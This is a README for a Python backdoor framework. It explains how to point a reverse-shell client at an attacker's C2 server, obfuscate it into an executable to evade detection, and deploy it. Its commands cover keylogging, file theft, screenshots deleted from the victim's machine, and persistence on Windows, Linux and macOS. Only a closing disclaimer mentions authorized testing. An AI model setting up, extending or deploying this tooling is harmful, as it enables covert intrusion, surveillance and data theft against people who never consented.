# Python Backdoor Framework

A comprehensive client-server backdoor framework written in Python. This toolkit provides a stable reverse shell connection with advanced features like file transfer, system persistence, and obfuscation capabilities.

## Components

1. `backdoor_client.py` - The basic backdoor client that connects back to the C2 server
2. `enhanced_server.py` - Command and control server to manage backdoor connections
3. `encrypted_backdoor_client.py` - Advanced backdoor client with strong encryption
4. `encrypted_server.py` - Encrypted command and control server with enhanced security
5. `obfuscator.py` - Tool to obfuscate the backdoor to evade detection

## Security Features

### Encryption

- **AES-128 encryption** (via Fernet) for all communications
- **HMAC authentication** to verify message integrity
- **SSL/TLS support** for secure communications
- **Password-based authentication** to prevent unauthorized connections
- **Key derivation** using PBKDF2 for stronger keys

### Anti-Forensic Capabilities

- **Secure screenshot capture** - Screenshots are securely deleted from the victim's system after sending
- **Memory-efficient processing** - Sensitive data is processed in memory when possible
- **Trace removal** - All temporary files are thoroughly wiped from the system
- **Pattern cleanup** - Searches for and removes any leftover files matching known patterns

## Setup

### Requirements

- Python 3.6+
- Required Python packages:
  ```
  pip install cryptography pyinstaller astor
  ```
  
For advanced features, install additional packages:
  ```
  pip install pillow psutil pynput
  ```

### Basic Usage

1. Edit the client configuration to set your C2 server IP and port:
   ```python
   # For basic backdoor
   backdoor = Backdoor(host="YOUR_SERVER_IP", port=4444)
   
   # For encrypted backdoor
   backdoor = EncryptedBackdoor(host="YOUR_SERVER_IP", port=4444, password="YOUR_PASSWORD")
   ```

2. Start the appropriate server:
   ```
   # For basic server
   python enhanced_server.py [custom_port]
   
   # For encrypted server
   python encrypted_server.py --port 4444 --password "YOUR_PASSWORD"
   ```

3. Deploy the backdoor client to the target system using one of the methods below.

### Obfuscation

Use the obfuscator to make the backdoor more difficult to detect:

```
python obfuscator.py -H YOUR_SERVER_IP -p 4444 -o obfuscated_backdoor.py
```

To create an executable:

```
python obfuscator.py -H YOUR_SERVER_IP -p 4444 -e --icon path/to/icon.ico
```

## Server Commands

Once a backdoor client connects to your server, you can use the following commands:

- `help` - Show available commands
- `list` - List all connected clients
- `connect <id>` - Connect to a specific client
- `disconnect` - Disconnect from the current session
- `download <file>` - Download a file from the client
- `upload <file>` - Upload a file to the client
- `sysinfo` - Show system information
- `persist` - Install persistence mechanisms
- `screenshot` or `grab_screen` - Take a screenshot and securely delete it from victim's system
- `keylogger_start` - Start keylogger (encrypted backdoor only)
- `keylogger_stop` - Stop keylogger (encrypted backdoor only)
- `keylogger_dump` - Show captured keystrokes (encrypted backdoor only)
- `clear` - Clear the screen
- `history` - Show command history
- `exit` or `quit` - Exit the server

## Advanced Features (Encrypted Backdoor)

### SSL/TLS Encryption

The encrypted backdoor uses SSL/TLS when available, with fallback to AES-128 encryption.

### HMAC Authentication

All messages include HMAC authentication to verify integrity and prevent tampering.

### Password Protection

The connection between the client and server is protected by a password.

### File Chunking

Large files are split into chunks for secure and reliable transfer.

### Anti-Forensic Screenshots

When taking screenshots, the encrypted backdoor:
1. Creates the screenshot in memory first
2. Saves to a temporary location with randomized name
3. Transfers the file to the attacker
4. Immediately and securely deletes the file
5. Performs a thorough cleanup of any similar files

## Persistence Mechanisms

The backdoor includes several persistence methods depending on the target operating system:

### Windows
- Startup folder installation
- Registry key addition
- Scheduled task (encrypted backdoor only)

### Linux
- Systemd service creation
- Crontab entry
- .bashrc modification (encrypted backdoor only)

### macOS
- LaunchAgent creation
- Login items (encrypted backdoor only)

## Detection Evasion

- The obfuscator tool creates heavily obfuscated code
- Variable and function renaming
- Junk code injection
- Compression and encoding of payload
- Anti-analysis techniques
- Removal of forensic evidence

## Disclaimer

This tool is provided for educational and authorized penetration testing purposes only. Unauthorized use of this software against systems you do not own or have permission to test is illegal and unethical.

The authors take no responsibility for any misuse of this software. Always obtain proper authorization before using any penetration testing tools.

## License

This project is for educational purposes only. 